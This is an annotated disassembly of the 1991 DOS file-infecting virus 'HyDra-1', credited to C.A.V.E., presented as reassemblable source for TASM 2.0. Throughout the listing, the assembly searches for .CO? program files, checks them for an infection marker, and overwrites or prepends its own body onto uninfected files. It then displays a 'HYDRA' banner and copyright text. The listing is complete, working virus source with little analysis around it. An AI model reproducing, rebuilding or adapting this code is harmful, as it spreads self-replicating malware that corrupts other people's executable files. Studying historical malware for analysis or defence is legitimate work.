PAGE  59,132
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                             HYDRA1                                   ;;
;;;                                      ;;
;;;                                                                      ;;
;;;  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ;;
;;;                                                                      ;;
;;;  Reassemble with TASM 2.0                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

DATA_1E     EQU 80H
DATA_12E    EQU 193H
DATA_13E    EQU 196H
DATA_14E    EQU 271H
  
SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A
  
  
        ORG 100h
  
HYDRA1      PROC    FAR
  
START:
        JMP LOC_1           ; (0189)
        DB   59H, 44H, 00H, 00H
DATA_3      DB  'HyDra-1   Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_6      DW  0, 84FCH
DATA_8      DW  0
DATA_9      DB  0
        DB  29 DUP (0)
DATA_10     DB  0
        DB  13 DUP (0)
DATA_11     DB  'HYDRA$'
COPYRIGHT   DB  'Copyright (c)'
        DB  '  1991 by C.A.V.E.  $'
LOC_1:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,193H
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_9
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_3+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_5           ; Jump if carry Set
LOC_2:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_10
        MOV AL,2
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_12E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,193H
        MOV CS:DATA_8,AX
        CMP WORD PTR DS:DATA_13E,4459H
        JNE LOC_3           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_6           ; Jump if carry Set
        JMP SHORT LOC_2     ; (01AB)
LOC_3:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_4           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_8
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_4:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_5:
        MOV AH,1AH
        MOV DX,DATA_1E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_7     ; (0254)
        DB  90H
LOC_6:
        PUSH    DX
        XOR AX,AX           ; Zero register
        MOV AX,0F00H
        INT 10H         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        MOV AH,0
        INT 10H         ; Video display   ah=functn 00h
                        ;  set display mode in al
        MOV AX,200H
        MOV DH,6
        MOV DL,25H          ; '%'
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        XOR DX,DX           ; Zero register
        MOV DX,OFFSET DATA_11
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,17H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV DX,OFFSET COPYRIGHT
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,18H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        MOV AX,3504H
        INT 21H         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        MOV AX,ES
        MOV DX,BX
        MOV DS,AX
        MOV AX,2509H
        INT 21H         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        MOV AX,0
        INT 21H         ; DOS Services  ah=function 00h
                        ;  terminate, cs=progm seg prefx
LOC_7:
        XOR DI,DI           ; Zero register
        MOV SI,DATA_14E
        MOV CX,22H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_6,0
        MOV WORD PTR CS:DATA_6+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_6
        DB   1EH, 07H,0B9H,0FFH,0FFH,0BEH
        DB   93H, 02H,0BFH, 00H, 01H, 2BH
        DB  0CEH,0F3H,0A4H, 2EH,0C7H, 06H
        DB   00H, 01H, 00H, 01H, 2EH, 8CH
        DB   1EH, 02H, 01H, 8BH,0C3H, 2EH
        DB  0FFH, 2EH, 00H, 01H,0CDH
        DB  20H
  
HYDRA1      ENDP
  
SEG_A       ENDS
  
  
  
        END START
        